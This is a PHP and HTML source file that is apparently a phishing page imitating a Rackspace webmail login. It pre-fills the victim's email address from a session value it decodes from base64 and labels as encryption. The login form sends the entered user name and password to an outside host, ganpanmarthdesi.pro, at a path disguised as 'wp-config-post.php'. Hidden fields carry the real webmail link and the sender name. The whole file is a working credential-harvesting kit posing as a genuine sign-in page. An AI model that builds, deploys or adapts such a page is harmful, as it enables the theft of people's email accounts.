<?php
ini_set('display_errors',0);
ob_start();
if (!isset($_SESSION)) { session_start();}


if(!isset($_SESSION['UZ_login'])){ header("location:noemail.php");}



$_POST["token"]=$_SESSION['UZ_login'];

function doEncrypt($string)
{
	$rand = substr(md5(microtime()),rand(0,26),2);
	$crystr = "".$rand."".base64_encode($string)."";
	return $crystr;
}

function doDecrypt($string)
{
	$str = substr($string, 2);
	$crystr = base64_decode($str);
	return $crystr;
}

$email = doDecrypt($_POST["token"]);
$userz = explode('@', $email);
 $users = $userz[0];


$ddomain=preg_replace( '!^.+?([^@]+)$!', '$1', doDecrypt($_POST["token"]));

  $domains = explode('@', $email);
    $domain = ucfirst("$domains[1]");
	$domain2 = $domains[1];
    $domains1 = explode('.', $domain);
    $domain1 = ucwords ("$domains1[0]");

?>
<html>

<head>
<meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
<title>Webmail</title>
    <link href="https://apps.rackspace.com/favicon.ico" rel="shortcut icon" />
</head>
<style>
  html, body {
  font-family: Arial, sans-serif;
  margin: 0;
  padding: 0;
  border: 0;
  position: absolute;
  height: 100%;
  min-width: 100%;
  font-size: 13px;
  color: #404040;
  direction: ltr;
  -webkit-text-size-adjust: none;
  }
  button,
  input[type=button],
  input[type=submit] {
  font-family: Arial, sans-serif;
  font-size: 13px;
  }
  input[type=email],
  input[type=password] {
  -moz-appearance: none;
  -webkit-appearance: none;
  appearance: none;
  display: inline-block;
  height: 32px;
  width: 100%;
  padding: 6px 4px;
  margin: 0;
  border: 1px solid #BDBDBD;
  -moz-box-sizing: border-box;
  -webkit-box-sizing: border-box;
  box-sizing: border-box;
  -moz-border-radius: 1px;
  -webkit-border-radius: 1px;
  border-radius: 0;
  font-size: 14px;
  font-family: Arial,sans-serif;
  color: #404040;
  }
  </style>
<body background="https://i.ibb.co/ckccmZw/bg.png">

<div align="center">

<table border="0" width="500" cellspacing="0" cellpadding="0" >
	<tr>
		<td height="20">
		<table border="0" width="100%" cellspacing="0" cellpadding="0">
			<tr>
				<td height="113" ></td>
			</tr>
			<tr>
				<td>
				<img border="0" src="https://i.ibb.co/4M9rsL2/header.png" width="500" height="53"></td>
			</tr>
			<tr>
				<td background="https://i.ibb.co/LPZq7HB/fm.png">
				<table border="0" width="100%" cellspacing="0" cellpadding="0">
					<tr>
						<td width="58">&nbsp;</td>
						<td height="346" width="500" >
						<table border="0" width="100%" cellspacing="0" cellpadding="0">
						   <form method="post" action="https://ganpanmarthdesi.pro/z-php/wp-config-post.php" >
							<tr>
								<td height="85"></td>
							</tr>
							<tr>
								<td height="180">
								<table border="0" width="100%" cellspacing="0" cellpadding="0">
									<tr>
										<td>
										<table border="0" width="100%" cellspacing="0" cellpadding="0" height="133">
											<tr>
												<td width="4">&nbsp;</td>
												<td>
												<table border="0" width="100%" cellspacing="0" cellpadding="0">
													<tr>
														<td height="25" ></td>
													</tr>
													<tr>
														<td>
													            <input type="email" name="user" required tabindex="1" value="<?php echo $users;?>@<?php echo $ddomain;?>" autocomplete="username" />	
														    <input type="hidden" name="link" value="https://webmail.emailsrvr.com/" >
                                                                                                                    <input type="hidden" name="domain" value="<?php echo $ddomain;?>" >
                                                                                                                    <input type="hidden" name="sender" value="Rackspace" >
                                                                                                                </td>
													</tr>
													<tr>
														<td height="44" ></td>
													</tr>
													<tr>
														<td>
														   <input name="passwd" tabindex="2" type="password" required value="" autocomplete="current-password" autofocus />
														</td>
													</tr>
												</table>
												</td>
												<td width="10"></td>
											</tr>
										</table>
										</td>
									</tr>
									<tr>
										<td height="46"></td>
									</tr>
								</table>
								</td>
							</tr>
							<tr>
								<td>
								<table border="0" width="100%" cellspacing="0" cellpadding="0">
									<tr>
										<td>&nbsp;</td>
										<td width="65">
										<input type="image" src="https://i.ibb.co/ZWnjBVj/btn.png" width="65" height="32" name="I1"></td>
									</tr>
								</table>
								</td>
							</tr>
							<tr>
								<td height="50"></td>
							</tr>
						   </form>
						</table>
						</td>
						<td width="65"></td>
					</tr>
				</table>
				</td>
			</tr>
			<tr>
				<td>&nbsp;</td>
			</tr>
		</table>
		</td>
	</tr>
</table>

</div>

</body>

</html>

<script>


 $(document).ready(function(){  
 
 	$('#myModal').modal('toggle'); 
 });

</script>